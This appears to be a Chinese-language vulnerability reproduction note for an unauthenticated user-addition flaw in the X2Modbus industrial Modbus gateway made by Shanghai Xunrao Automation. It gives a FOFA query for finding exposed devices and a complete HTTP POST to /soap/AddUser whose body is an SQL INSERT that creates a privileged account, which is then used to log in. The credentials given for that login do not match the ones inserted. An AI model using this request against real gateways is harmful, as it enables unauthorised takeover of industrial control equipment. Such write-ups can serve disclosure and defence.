# 上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞

# 一、漏洞简介
X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞

# 二、影响版本
+ X2Modbus

# 三、资产测绘
+ fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
+ 特征

![1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936.png](./img/ypZ9XWVltXmWxcJb/1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936-329773.png)

# 四、漏洞复现
```java
POST /soap/AddUser HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 111
Connection: close
Referer: 
Cookie: language=zh-cn; language=zh-cn

insert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME) values('stc','stc123456','1','2024-4-8','0:31:43')
```

![1712507596517-ebcb5e1f-fb34-499d-8d66-6f1190d8f714.png](./img/ypZ9XWVltXmWxcJb/1712507596517-ebcb5e1f-fb34-499d-8d66-6f1190d8f714-655700.png)

使用添加的账户`stc/stc`登录系统

![1712507789057-5844ddbc-3b9b-4941-83bd-4af254f8508a.png](./img/ypZ9XWVltXmWxcJb/1712507789057-5844ddbc-3b9b-4941-83bd-4af254f8508a-197429.png)



> 更新: 2024-04-16 16:50:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lyagwfg3rha3y0xp>